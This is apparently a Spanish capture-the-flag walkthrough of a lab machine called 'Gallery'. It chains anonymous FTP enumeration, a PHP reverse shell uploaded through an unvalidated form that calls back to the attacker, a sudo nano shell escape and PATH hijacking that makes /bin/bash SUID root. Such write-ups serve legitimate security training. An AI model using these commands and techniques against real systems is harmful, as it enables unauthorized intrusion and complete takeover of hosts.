
## 1. Reconocimiento

```bash
sudo nmap -sS -p- --min-rate 5000 172.17.0.2 -oG nmap
nmap -sVC -p21,80 172.17.0.2 -oG vers
```

Puertos abiertos:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 21 | FTP | vsftpd 3.0.5 — login anónimo permitido |
| 80 | HTTP | Apache 2.4.58 (Ubuntu) — título: Gallery |

---

## 2. Enumeración FTP

El servidor FTP acepta login anónimo:

```bash
ftp 172.17.0.2
# usuario: Anonymous
```

```
drwxr-xrwx    1 ftp      ftp          4096 Mar 30  2025 ftp
-rw-r--r--    1 ftp      ftp        335070 Mar 27  2025 image_1.jpg
-rw-r--r--    1 ftp      ftp        442122 Mar 27  2025 image_2.jpg
...
-rw-r--r--    1 ftp      ftp        493404 Mar 27  2025 image_7.jpg
```

Solo hay imágenes JPG. La carpeta `ftp/` está vacía. Nada aprovechable directamente, pero confirma que el servidor gestiona imágenes.

---

## 3. Enumeración web

La raíz del servidor muestra una galería con las mismas imágenes que en FTP. En el código fuente se ve que se cargan desde `gallery/uploads/images/`. Se accede directamente al directorio de subidas:

```bash
curl "http://172.17.0.2/gallery/uploads/"
```

El listado de directorios está activo y expone dos entradas:

```
handler.php   2025-03-28 15:28   527
images/       2025-03-29 23:15
```

Se accede a `handler.php`:

```bash
curl "http://172.17.0.2/gallery/uploads/handler.php"
```

```html
<form enctype="multipart/form-data" method="POST">
    <input name="image" type="file" />
    <input type="submit" value="Subir imagen" />
</form>
```

Formulario de subida de archivos sin ningún tipo de validación visible.

---

## 4. Reverse shell via file upload

Se copia la reverse shell PHP de Kali y se ajustan IP y puerto:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php revshell.php
```

```php
$ip = '172.17.0.1';  // IP del atacante en la red Docker
$port = 4444;
```

Se sube el archivo a través del formulario en `handler.php`. Se confirma que se ha subido correctamente y queda accesible en `/gallery/uploads/images/revshell.php`.

Se activa el listener con penelope y se solicita el archivo:

```bash
penelope
# [+] Listening for reverse shells on 0.0.0.0:4444
```

Al visitar `http://172.17.0.2/gallery/uploads/images/revshell.php` en el navegador, llega la conexión:

```
[+] [New Reverse Shell] => 0fa87b92d525 172.17.0.2 Linux-x86_64 👤 www-data(33)
[+] ⭐ Agent deployed via /usr/bin/python3

www-data@0fa87b92d525:/$
```

---

## 5. Escalada a gallery — nano GTFObins

Se comprueba qué puede ejecutar `www-data` con sudo:

```bash
sudo -l
```

```
User www-data may run the following commands on 0fa87b92d525:
    (gallery) NOPASSWD: /bin/nano
    (www-data) NOPASSWD: /bin/nano
```

`www-data` puede ejecutar `nano` como el usuario `gallery` sin contraseña. Nano tiene una funcionalidad integrada que permite ejecutar comandos externos del sistema: la tecla Ctrl+T abre una línea donde se puede escribir cualquier comando y se ejecuta en el contexto del proceso de nano, es decir, como `gallery`.

```bash
sudo -u gallery /bin/nano -s /bin/bash
```

Dentro de nano:
1. Se escribe `/bin/bash` en el editor
2. Se pulsa **Ctrl+T** — nano ejecuta el contenido seleccionado como comando de shell
3. Se pulsa **Ctrl+T** una segunda vez para confirmar

El resultado es una shell interactiva como `gallery`:

```bash
gallery@0fa87b92d525:/$ id
uid=1001(gallery) gid=1001(gallery) groups=1001(gallery)
gallery@0fa87b92d525:/$ whoami
gallery
```

> **Nota:** es imprescindible usar `-u gallery` en el comando sudo. Sin esa flag, nano se ejecuta como `www-data` (que también tiene el permiso) y la shell resultante también es `www-data`, sin escalada.

---

## 6. Escalada a root — PATH hijacking

Se comprueba `sudo -l` desde `gallery`:

```bash
sudo -l
```

```
Matching Defaults entries for gallery on 0fa87b92d525:
    env_reset, mail_badpass, env_keep+=PATH, use_pty

User gallery may run the following commands on 0fa87b92d525:
    (ALL) NOPASSWD: /usr/local/bin/runme
```

Dos puntos clave:

**1. `env_keep+=PATH`** — por defecto, sudo reemplaza el PATH del usuario por un valor seguro y controlado. Esta directiva anula ese comportamiento y preserva el PATH que tenga el usuario en el momento de invocar sudo. Eso significa que si se antepone un directorio controlado por el atacante al PATH, los binarios llamados por nombre (sin ruta absoluta) dentro del comando sudoado los buscarán ahí primero.

**2. `runme` llama a `convert` sin ruta absoluta** — al ejecutar el binario se ve el error:

```bash
sudo /usr/local/bin/runme
# Converting image...
# sh: 1: convert: not found
# Done.
```

El binario intenta ejecutar `convert` (normalmente parte de ImageMagick) pero no lo encuentra porque no está instalado. Lo importante es que lo busca por nombre en el PATH — ahí está la vulnerabilidad.

Se crea un `convert` falso en `/tmp` que añade el bit SUID a bash:

```bash
echo "chmod u+s /bin/bash" > /tmp/convert
chmod +x /tmp/convert
```

Se antepone `/tmp` al PATH y se ejecuta `runme` con sudo:

```bash
export PATH=/tmp:$PATH
sudo /usr/local/bin/runme
# Converting image...
# Done.
```

Esta vez no hay error: sudo encontró el `convert` de `/tmp` primero. Se comprueba el efecto:

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash
```

Bash tiene SUID de root. Se lanza con `-p` para que respete el UID efectivo:

```bash
bash -p
bash-5.2# id
uid=1001(gallery) gid=1001(gallery) euid=0(root) groups=1001(gallery)
bash-5.2# whoami
root
```